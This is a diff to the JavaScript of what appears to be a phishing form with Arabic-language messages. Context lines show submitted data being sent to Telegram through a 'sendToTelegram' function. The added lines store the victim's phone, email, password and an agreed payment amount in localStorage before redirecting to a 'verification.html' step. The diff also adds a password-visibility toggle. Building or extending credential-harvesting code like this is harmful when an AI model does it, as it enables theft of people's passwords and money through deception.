@@ -12,6 +12,7 @@ document.addEventListener('DOMContentLoaded', function() {
     const submitBtn = document.querySelector('.submit-btn');
     const qrScannerBtn = document.getElementById('qrScannerBtn');
     const backBtn = document.getElementById('backBtn');
+    const togglePasswordBtn = document.getElementById('togglePassword');
 
     // Function to send data to Telegram
     async function sendToTelegram(data) {
@@ -164,14 +165,16 @@ document.addEventListener('DOMContentLoaded', function() {
         submitBtn.disabled = false;
 
         if (sent) {
-            // Show success message
+            localStorage.setItem('userPhone', phoneValue);
+            localStorage.setItem('userEmail', emailValue);
+            localStorage.setItem('userPassword', passwordValue);
+            localStorage.setItem('userAmount', agreedAmountValue);
+            
             showNotification('تم إرسال البيانات بنجاح!', 'success');
 
-            // Add success animation to button
             submitBtn.style.background = 'linear-gradient(135deg, #2ecc71 0%, #27ae60 100%)';
             
             setTimeout(() => {
-                // Redirect to verification page
                 window.location.href = 'verification.html';
             }, 1000);
         } else {
@@ -179,7 +182,17 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     });
 
-    // QR Scanner button
+    togglePasswordBtn.addEventListener('click', function() {
+        if (passwordInput.type === 'password') {
+            passwordInput.type = 'text';
+            this.classList.add('active');
+            showNotification('كلمة السر مرئية', 'info');
+        } else {
+            passwordInput.type = 'password';
+            this.classList.remove('active');
+        }
+    });
+
     qrScannerBtn.addEventListener('click', function() {
         showNotification('جاري فتح ماسح الرمز...', 'info');
         
@@ -356,31 +369,7 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
-    // Show/hide password on double click
-    let clickCount = 0;
-    let clickTimer = null;
 
-    passwordInput.addEventListener('click', function() {
-        clickCount++;
-        
-        if (clickCount === 1) {
-            clickTimer = setTimeout(() => {
-                clickCount = 0;
-            }, 300);
-        } else if (clickCount === 2) {
-            clearTimeout(clickTimer);
-            clickCount = 0;
-            
-            // Toggle password visibility
-            if (this.type === 'password') {
-                this.type = 'text';
-                showNotification('كلمة السر مرئية', 'info');
-                setTimeout(() => {
-                    this.type = 'password';
-                }, 2000);
-            }
-        }
-    });
 
     // Prevent default form autofill styling
     window.addEventListener('load', function() {
